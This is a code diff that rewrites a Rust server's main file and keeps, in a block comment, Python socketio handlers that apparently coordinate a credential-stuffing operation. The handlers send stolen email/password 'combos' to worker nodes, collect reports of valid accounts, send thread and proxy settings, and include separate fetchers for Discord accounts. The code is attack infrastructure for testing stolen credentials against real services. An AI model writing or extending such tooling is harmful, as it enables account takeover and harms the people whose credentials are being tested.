@@ -1,37 +1,81 @@
 mod config;
 mod db;
-use rocket::{get, post, request::{FromRequest, Request, Outcome}, async_trait, response::Response};
-use serde_json::json;
+mod params;
+mod rest;
+mod socketio;
 
-struct Authenticated(bool);
+use rocket::tokio;
 
-#[async_trait]
-impl<'r> FromRequest<'r> for Authenticated {
-    type Error = std::convert::Infallible;
-
-    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
-        let headers = request.headers().get("Authorization");
-        for header in headers {
-            if config::APIKEYS.contains(&header) {
-                return Outcome::Success(Authenticated(true))
-            }
-        }
-        Outcome::Success(Authenticated(false))
-    }
+#[tokio::main]
+async fn main() {
+    rest::rocket().unwrap();
 }
 
-#[get("/fetch")]
-async fn fetch_email(auth: Authenticated) {
-    if auth.0 {
-        
-    }
+/*
+@socketio.event
+def fetch():
+    data = db.fetchEmail()
+    if not data:
+        emit('no_email')
+        return
+    
+    emit('combo', {
+        'e': data.get('email'),
+        'p': data.get('password'),
+        'pr': params.parse(data.get('params')),
+        'id': data.get('id')
+    })
 
-    // let data = db::fetch_email().await;
-}
-// #[post("/add")]
-// #[post("/invalidate")]
-// #[get("/")]
+@socketio.event
+def invalid(uuid):
+    db.invalidateCombo(uuid)
 
-fn main() {
-    println!("Hello, world!");
-}
+@socketio.event
+def validate(data):
+    comboId = data.get('id')
+    accountInfo = data.get('acc')
+
+    #db.validateCombo(comboId)
+    notifs.notify(comboId, accountInfo)
+
+@socketio.event
+def settings():
+    print('Sending settings')
+    emit('settings', {
+        'threads': config.ThreadsPerNode,
+        'proxies': []
+    })
+
+# on connection check if the node is authenticated
+@socketio.event
+def connect():
+    if not authenticated():
+        return False
+
+    emit('authenticated')
+    return True
+
+@socketio.event
+def disconnect():
+    print('Node disconnected')
+@socketio.event
+def fetchDiscord():
+    data = db.fetchDiscordEmail()
+    if not data:
+        emit('no_email')
+        return
+    
+    emit('combo', {
+        'e': data.get('email'),
+        'p': data.get('password'),
+        'pr': params.parse(data.get('params')),
+        'id': data.get('id')
+    })
+@socketio.event
+def fetchValidEmail():
+    data = db.fetchValidEmail()
+    if not data:
+        emit('no_email')
+        return
+ */
+
